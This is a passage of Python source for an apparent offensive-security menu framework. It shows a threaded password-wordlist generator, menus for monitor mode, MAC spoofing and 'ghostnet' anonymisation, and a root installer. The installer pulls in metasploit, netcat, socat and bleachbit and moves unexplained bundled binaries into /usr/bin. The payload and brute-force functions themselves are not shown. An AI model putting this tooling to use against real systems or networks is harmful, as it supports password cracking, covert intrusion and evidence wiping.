    animation_frame = 0
    animation_frames = ['|', '/', '-', '\\']

    for _ in range(os.cpu_count()):
        t = threading.Thread(target=generate_passwords)
        t.daemon = True
        t.start()

    generated_passwords = set()

    while True:
        password = password_queue.get()
        if password in generated_passwords:
            continue
        else:
            generated_passwords.add(password)
            with open("generated_wordlist.txt", "a") as f:
                f.write(password + "\n")

        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'{len(generated_passwords)}/{total_possible_passwords} passwords generated {animation_frames[animation_frame % len(animation_frames)]}')
        animation_frame += 1

        time.sleep(0.1)

        if len(generated_passwords) == total_possible_passwords:
            break


def general():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('\n1. Enable monitor mode')
    print('\n2. Disable monitor mode')
    print('\n3. Ip adress and public IP.')
    print('\n4. your mac adress')
    print('\n5. Enable ghostnet')
    print('\n6. Disable ghostnet')
    print('\n7. Ifconfig')
    print('\n8. generate wordlist')

    ge = input('FG_Teams: ')

    if ge == '1':
        en_monitor()
    elif ge == '2':
        dis_monitor()
    elif ge == '3':
        showIp_and_public()
    elif ge == '4':
        show_mac_addr()
    elif ge == '5':
        os.system('ghostnet start')
    elif ge == '6':
        os.system('ghostnet stop')
    elif ge == '7':
        os.system('ifconfig')
    elif ge == '8':
        wordlist()
    else:
        print('invalid argument exiting')
        sys.exit()



def Others():
    ...


# <---main--->
def main():
    os.system('clear')
    print(Fore.BLUE, banner)

    print(menu)

    me = input('\n\nSelect your option: ')

    if me == '1':
        Android()
    elif me == '2':
        bruteforce()
    elif me == '3':
        StegMenu()
    elif me == '4':
        Mac()
    elif me == '5':
        wireless()
    elif me == '6':
        Ghostnet()
    elif me == '7':
        coming_soon()
    elif me == '8':
        coming_soon()
    elif me == '9':
        Piracy()
    elif me == '10':
        general()
    elif me == '11':
        More()
    elif me == '12':
        WebApp()
    elif me == '0':
        sys.exit(0)
    else:
        print('invalid argument exiting')
        sys.exit()


# <----Checking root---->
def check_root():
    if os.geteuid() != 0:
        exit("You need to have root privileges to create payload.\ntry again using sudo")


def check_os():
    os = subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if os != 0:
        print('This distro or os is not supported this framework is only for arch! thanks')
        sys.exit(0)


# <--all needed modules for payload creation-->
def installer():
    print(Fore.BLUE, banner)

    print("Checking for the needed modules")

    os.system('chmod 777 insta lib/brute-force')

    # nyx tor macchanger
    rc = subprocess.call(['which', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('tor is installed ✔')
    else:
        print('tor and related tools are not installed \ninstalling')
        subprocess.call(['yes | pacman -S nyx macchanger tor gnu-netcat socat bleachbit'], shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # Steghide
    rc = subprocess.call(['which', 'steghide'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('steghide is installed! ✔️')
    else:
        print('steghide is not installed \ninstalling')
        subprocess.call(['yes | pacman -S steghide'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # fg_movies
    rc = subprocess.call(['which', 'fg_movies'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('fg_movies is installed! ✔️')
    else:
        print('fg_movies is not installed \ninstalling')
        subprocess.call(['chmod +x ' + str(os.getcwd()) + '/fg_movies '], shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        subprocess.call(['mv ' + str(os.getcwd()) + '/fg_movies ' + str(os.getcwd()) + '/ad.zip /usr/bin/'],
                        shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # xterm
    rc = subprocess.call(['which', 'xterm'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('xterm is installed! ✔️')
    else:
        print('xterm is not installed \ninstalling')
        subprocess.call(['yes | pacman -S xterm'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # postgresql
    rc = subprocess.call(['which', 'psql'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('postgresql is intsalled')
    else:
        print('postgresql is not installed \ninstalling')
        subprocess.call(['yes | pacman -S postgresql'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # Apktool
    rc = subprocess.call(['which', 'apktool'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('apktool is installed! ✔️')
    else:
        print('apktool not installed \ninstalling')
        subprocess.call(['chmod +x ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar'], shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        subprocess.call(['mv ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar /usr/bin/'],
                        shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # Zipalign
    zp = subprocess.call(['which', 'zipalign'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if zp == 0:
        print('zipalign is installed! ✔️')
    else:
        print('zipalign is not installed! \ninstalling zipalign')
        subprocess.call(['yes | pacman -S android-sdk-build-tools'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # apksigner
    jr = subprocess.call(['which', 'apksigner'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jr == 0:
        print("apksigner is installed! ✔️")
    else:
        print('apksigner is not installed ! \ninstalling jarsigner')
        subprocess.call(['yes | pacman -S android-sdk-build-tools'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # Msfvenom, metasploit
    ms = subprocess.call(['which', 'msfvenom'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if ms == 0:
        print('msfvenom is installed! ✔️')
    else:
        print('metasploit is not installed! \nInstalling Metasploit')
        subprocess.call(['yes | pacman -S metasploit'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    # Java
    jdk = subprocess.call(['which', 'java'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jdk == 0:
        print('open-jdk installed! ✔️')
    else:
        print('installing java')
        subprocess.call(['yes | pacman -S jdk-openjdk java-environment-common jre-openjdk'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # ghostnet
    gh = subprocess.call(['which', 'ghostnet'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if gh == 0:
        print('ghostnet is installed ✔️')
    else:
        print('ghostnet is not installed! \ninstalling')
        os.system('chmod +x ghostnet && mv ghostnet /usr/bin/ && mv ghostnet.log /opt/')

    print('everything setup perfectly ✔')
    time.sleep(2)


def check_connection():
    if os.path.isfile('/opt/fg.log'):
        with open('/opt/fg.log', 'r') as logf:
            if logf.readline() == "checked=True":
                logf.close()
    else:
        installer()
        with open('/opt/fg.log', 'w') as logf:
            logf.write('checked=True')
            logf.close()

if __name__ == '__main__':
    try:
        check_os()
        check_root()
        check_connection()
        main()
    except KeyboardInterrupt:
        print('\nExit signal received \nexiting ')
        sys.exit()

